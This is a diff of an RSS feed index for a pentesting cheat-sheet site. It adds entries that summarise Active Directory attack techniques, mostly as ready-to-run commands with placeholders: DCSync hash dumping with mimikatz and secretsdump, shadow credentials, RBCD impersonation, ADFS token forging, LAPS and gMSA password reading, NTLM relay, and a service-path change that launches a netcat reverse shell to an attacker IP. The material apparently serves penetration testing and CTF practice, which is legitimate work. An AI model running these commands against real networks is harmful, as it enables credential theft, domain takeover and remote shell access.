@@ -15,11 +15,109 @@
       <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID .\mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain .\mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
     </item>
     <item>
+      <title>Account Operators</title>
+      <link>https://tldrbins.github.io/account_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/account_operators/</guid>
+      <description>Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create a new user password object $new_user_password = ConvertTo-SecureString &amp;#39;&amp;lt;NEW_USER_PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force 4. Create a new user account New-AdUser &amp;#39;&amp;lt;NEW_USER&amp;gt;&amp;#39; -enabled $true -accountpassword $new_user_password -Credential $cred 5.</description>
+    </item>
+    <item>
+      <title>AD Recycle Bin</title>
+      <link>https://tldrbins.github.io/ad_recycle_bin/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ad_recycle_bin/</guid>
+      <description>Privesc #1: Restore deleted AD account Windows 1. Import AD module import-module activedirectory 2. Query all deleted objects within domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects 3. Get all details for the deleted account Get-ADObject -filter { SAMAccountName -eq &amp;lt;DELETED_USER&amp;gt; } -includeDeletedObjects -property * 4. Restore the deleted account # Rename the target account to avoid user exists error Restore-ADObject -Identity &amp;lt;OBJECT_GUID&amp;gt; -NewName &amp;#39;&amp;lt;NEW_USER&amp;gt;&amp;#39; -TargetPath &amp;#39;CN=Users,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; </description>
+    </item>
+    <item>
+      <title>ADCS</title>
+      <link>https://tldrbins.github.io/adcs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/adcs/</guid>
+      <description>Enum (From Linux) certipy-ad nxc certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser # Import ADCSTemplate module import-module .</description>
+    </item>
+    <item>
+      <title>AddKeyCredentialLink</title>
+      <link>https://tldrbins.github.io/addkeycredentiallink/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/addkeycredentiallink/</guid>
+      <description>Privesc #1: Shadow credentials Linux Windows 0. Pre-check [optional] python3 pywhisker.py --action list -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --dc-ip &amp;lt;DC&amp;gt; -t &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --dc-ip &amp;lt;DC&amp;gt; -t &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; --use-ldaps # Fix module &amp;#39;OpenSSL.crypto&amp;#39; has no attribute &amp;#39;PKCS12Type&amp;#39; pip3 install -I pyopenssl==24.0.0 2. Request TGT using the PFX sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; python3 gettgtpkinit.py -cert-pfx &amp;lt;PFX_FILE&amp;gt; -pfx-pass &amp;#39;&amp;lt;GENERATED_PASSWORD&amp;gt;&amp;#39; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;TARGET_USER&amp;gt;&amp;#39; &amp;lt;TARGET_USER&amp;gt;.</description>
+    </item>
+    <item>
       <title>AddSelf</title>
       <link>https://tldrbins.github.io/addself/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/addself/</guid>
       <description>Privesc #1: Add self to group (From Linux) bloodyAD powerview.py 1. Add self to group # With password python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;GROUP&amp;gt; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; # With Kerberos python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;GROUP&amp;gt; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; 2. Add genericAll over target group # With password python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; add genericAll &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; # With Kerberos python3 bloodyAD.</description>
+    </item>
+    <item>
+      <title>ADFS</title>
+      <link>https://tldrbins.github.io/adfs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/adfs/</guid>
+      <description>Abuse #1: Generate a SAML 2.0 token for some app Windows 1. Dump encrypted PFX and DKM key # With ADFS service account .\ADFSDump.exe Ref: ADFSDump&#xA;2. Convert to binary blob # Copy private key(s) echo &amp;#39;&amp;lt;PRIVATE_KEY&amp;gt;&amp;#39; | sed &amp;#39;s/-//g&amp;#39; | xxd -r -p &amp;gt; DkmKey.bin # Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End cat b64_blob | base64 -d &amp;gt; EncryptedPfx.bin 3. Check which private key is correct # The correct key will not show error python ADFSpoof.</description>
+    </item>
+    <item>
+      <title>AllowedToDelegate</title>
+      <link>https://tldrbins.github.io/allowedtodelegate/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/allowedtodelegate/</guid>
+      <description>Privesc #1: Forge a Ticket Linux Windows 1. Get a service ticket # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;TARGET_DOMAIN&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -impersonate Administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; 2. Remote export KRB5CCNAME=Administrator.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; wmiexec.py -k -no-pass administrator@&amp;lt;DC&amp;gt; Note: impacket-wmiexec may not work&#xA;1. TO-DO TO-DO </description>
+    </item>
+    <item>
+      <title>Bloodhound</title>
+      <link>https://tldrbins.github.io/bloodhound/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/bloodhound/</guid>
+      <description>Info Collection (From Linux) bloodhound-python # With password bloodhound-python -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip # With Kerberos sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; bloodhound-python -u &amp;lt;USER&amp;gt; -k -d &amp;lt;DOMAIN&amp;gt; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip -no-pass --use-ldaps Note: passing &amp;apos;-no-pass&amp;apos; will still ask for password, press enter&#xA;Info Collection (From Windows) SharpHound.exe SharpHound.ps1 .\SharpHound.exe -c all --outputdirectory C:\ProgramData # Import module . .</description>
+    </item>
+    <item>
+      <title>Constrained Delegation</title>
+      <link>https://tldrbins.github.io/constrained_delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
+      <description>Abuse #1: RBCD Attack Linux 1. Find delegation # Check delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k 2. Get a service ticket impacket-getST -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;TARGET_DOMAIN&amp;gt; -impersonate administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -self # Check forwardable flag describeTicket.py &amp;lt;TICKET_1&amp;gt;.ccache 3. RBCD Attack # Add delegation impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -delegate-from &amp;lt;USER&amp;gt; -delegate-to &amp;lt;TARGET_1&amp;gt; -action write -dc-ip &amp;lt;DC&amp;gt; -use-ldaps # Check sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k 4.</description>
+    </item>
+    <item>
+      <title>Cross Session Relay</title>
+      <link>https://tldrbins.github.io/cross_session_relay/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/cross_session_relay/</guid>
+      <description>Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay 1. Redirect auth request back to target # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&amp;lt;TARGET&amp;gt;:&amp;lt;RELAY_PORT&amp;gt; 2. Trigger auth request .\RemotePotato0.exe -m 2 -s &amp;lt;TARGET_SESSION_ID&amp;gt; -x &amp;lt;LOCAL_IP&amp;gt; -p &amp;lt;RELAY_PORT&amp;gt; Ref: RemotePotato0&#xA;1. All-in-one .\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 &amp;#34;C:\ProgramData\KrbRelay.</description>
+    </item>
+    <item>
+      <title>ExecuteDCOM</title>
+      <link>https://tldrbins.github.io/executedcom/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/executedcom/</guid>
+      <description>Abuse #1: ExecuteDCOM Linux # Revshell impacket-dcomexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; &amp;#39;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#39; -silentcommand -object MMC20 </description>
+    </item>
+    <item>
+      <title>ForceChangePassword</title>
+      <link>https://tldrbins.github.io/forcechangepassword/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/forcechangepassword/</guid>
+      <description>Change target user password (From Linux) BloodyAD rpcclient python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; Ref: bloodyAD&#xA;rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;setuserinfo2 &amp;lt;TARGET_USER&amp;gt; 23 &amp;lt;TARGET_USER_NEW_PASSWORD&amp;gt;&amp;#39; Change target user password (From Windows) Windows 1. Import PowerView . .\PowerView.ps1 2. Change Target User Password $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password </description>
+    </item>
+    <item>
+      <title>GenericAll</title>
+      <link>https://tldrbins.github.io/genericall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericall/</guid>
+      <description>Abuse #1: Change target user password Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add Full Control to current user dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -inheritance -action write -rights FullControl 2. Change password bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Ref: bloodyAD&#xA;1. Import PowerView.ps1 . .\PowerView.ps1 2. Change target user password $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password Abuse #2: Get shadow credentials Linux 0.</description>
+    </item>
+    <item>
+      <title>GenericWrite</title>
+      <link>https://tldrbins.github.io/genericwrite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericwrite/</guid>
+      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user Windows 1. Import PowerView . .\PowerView.ps1 2. Check target user Get-DomainUser &amp;lt;TARGET_USER&amp;gt; | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;TARGET_USER&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -no-pass -dc-ip &amp;lt;DC&amp;gt; Abuse #2 : Kerberoasting by adding spn Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.</description>
+    </item>
+    <item>
+      <title>GetChanges/GetChangesAll</title>
+      <link>https://tldrbins.github.io/getchanges_getchangesall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/getchanges_getchangesall/</guid>
+      <description>Abuse #1: DCSync Attack Linux Windows # With creds impacket-secretsdump -just-dc &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # With hashes impacket-secretsdump -hashes &amp;lt;HASH&amp;gt; -just-dc &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; .\mimikatz.exe &amp;#39;lsadump::dcsync /domain:&amp;lt;DOMAIN&amp;gt; /user:administrator&amp;#39; exit </description>
     </item>
     <item>
       <title>Kerberoasting</title>
@@ -34,6 +132,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/kerberos/</guid>
       <description>Users enum kerbrute kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; &amp;lt;USERNAMES_FILE&amp;gt; Ref: kerbrute&#xA;Usernames generator username-anarchy ./username-anarchy -i &amp;lt;USERS_FILE&amp;gt; | tee &amp;lt;USERNAMES_FILE&amp;gt; Ref: username-anarchy&#xA;Generate Kerberos ticket (From Linux) Kinit Impacket 1. Set up # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) &amp;lt;TARGET&amp;gt; &amp;lt;DC&amp;gt; &amp;lt;DOMAIN&amp;gt; # Step 2: Add domain controller as a DNS server to &amp;#39;/etc/resolv.</description>
+    </item>
+    <item>
+      <title>Krbrelayx</title>
+      <link>https://tldrbins.github.io/krbrelayx/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/krbrelayx/</guid>
+      <description>Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --action add --record &amp;lt;TARGET_RECORD&amp;gt; --data &amp;lt;LOCAL_IP&amp;gt; &amp;lt;TARGET_IP&amp;gt; Ref: krbrelayx tools</description>
     </item>
     <item>
       <title>LDAP</title>
@@ -57,6 +162,34 @@
       <description>Basic Commands # Single user and password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Single user and password (Active Directory) nxc &amp;lt;PROTOCOL&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; &amp;lt;TARGET&amp;gt; # Multiple users or passwords nxc &amp;lt;PROTOCOL&amp;gt; -u &amp;lt;USERNAMES&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; &amp;lt;TARGET&amp;gt; --continue-on-success # Match username to corresponding password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USERNAMES&amp;gt; -p &amp;lt;PASSWORDS&amp;gt; --no-bruteforce --continue-on-success # With hash nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;LM&amp;gt;:&amp;lt;NT&amp;gt; # With Kerberos, or STATUS_ACCOUNT_RESTRICTION (NTLM disabled) nxc &amp;lt;PROTOCOL&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k &amp;lt;TARGET&amp;gt; Supported protocols +----------------------------------------------------------+ | ftp | ldap | mssql | rdp | smb | ssh | vnc | winrm | wmi | +----------------------------------------------------------+ RID Brute nxc smb &amp;lt;TARGET&amp;gt; -u guest -p &amp;#39;&amp;#39; --rid-brute 10000 User Enum (Authenticated) nxc smb &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; --users Ref: Download nxc</description>
     </item>
     <item>
+      <title>NTLM Relay Attack</title>
+      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
+      <description>NTLM Relay Attack 1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;c:\programdata\socat.zip&amp;#39;, &amp;#39;c:\programdata&amp;#39;) .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80 Ref: socat&#xA;2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.</description>
+    </item>
+    <item>
+      <title>RBCD Attack</title>
+      <link>https://tldrbins.github.io/rbcd/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rbcd/</guid>
+      <description>RBCD Attack Linux Windows 0. Check machine account quota nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;TARGET&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; 2. Rbcd attack impacket-rbcd -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -delegate-from &amp;#39;EvilComputer$&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -action &amp;#39;write&amp;#39; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; 3. Impersonate sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -spn cifs/&amp;lt;TARGET_DOMAIN&amp;gt; -impersonate administrator -dc-ip &amp;lt;DC&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/EvilComputer:&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39; 4. Import ticket export KRB5CCNAME=administrator@cifs_&amp;lt;TARGET_DOMAIN&amp;gt;@&amp;lt;DOMAIN&amp;gt;.ccache 5. Post-Attack # Remote sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-psexec &amp;lt;DOMAIN&amp;gt;/administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass # Or secretsdump impacket-secretsdump administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass -just-dc-user Administrator 1.</description>
+    </item>
+    <item>
+      <title>ReadGMSAPassword</title>
+      <link>https://tldrbins.github.io/readgmsapassword/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/readgmsapassword/</guid>
+      <description>Abuse #1: Read GMSAPassword (From Linux) gMSADumper BloodyAD nxc python3 gMSADumper.py -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -l &amp;lt;DC&amp;gt; -d &amp;lt;DOMAIN&amp;gt; Ref: gMSADumper&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; get object &amp;lt;TARGET_OBJECT&amp;gt; --attr msDS-ManagedPassword Ref: bloodyAD&#xA;nxc ldap -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; &amp;lt;TARGET&amp;gt; --gmsa Abuse #2: Save as Cred Windows $gmsa = Get-ADServiceAccount -Identity &amp;lt;TARGET_NAME&amp;gt; -Properties &amp;#39;msDS-ManagedPassword&amp;#39; $mp = $gmsa.&amp;#39;msDS-ManagedPassword&amp;#39; $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).</description>
+    </item>
+    <item>
+      <title>ReadLAPSPassword</title>
+      <link>https://tldrbins.github.io/readlapspassword/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/readlapspassword/</guid>
+      <description>Abuse #1: Read LAPS Password Linux Windows ldapsearch -h &amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred </description>
+    </item>
+    <item>
       <title>RPC</title>
       <link>https://tldrbins.github.io/rpc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -71,6 +204,13 @@
       <description>Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite&#xA;With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With Dcsync right impacket nxc impacket-secretsdump &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; nxc smb -dc-ip &amp;lt;DC&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; --ntds </description>
     </item>
     <item>
+      <title>Server Operators</title>
+      <link>https://tldrbins.github.io/server_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/server_operators/</guid>
+      <description>Abuse #1: Change service path 1. Change service path # Assume nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binPath= &amp;#34;C:\ProgramData\nc.exe -e cmd.exe &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; # Start service sc.exe stop &amp;lt;SERVICE&amp;gt; Additional: Create service # Create a service sc.exe create &amp;lt;NEW_SERVICE&amp;gt; binpath= C:\ProgramData\rev.exe start= auto Note: there is a space after named arguments</description>
+    </item>
+    <item>
       <title>Silver Ticket</title>
       <link>https://tldrbins.github.io/silver_ticket/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -83,6 +223,20 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/winrm_from_windows_vm/</guid>
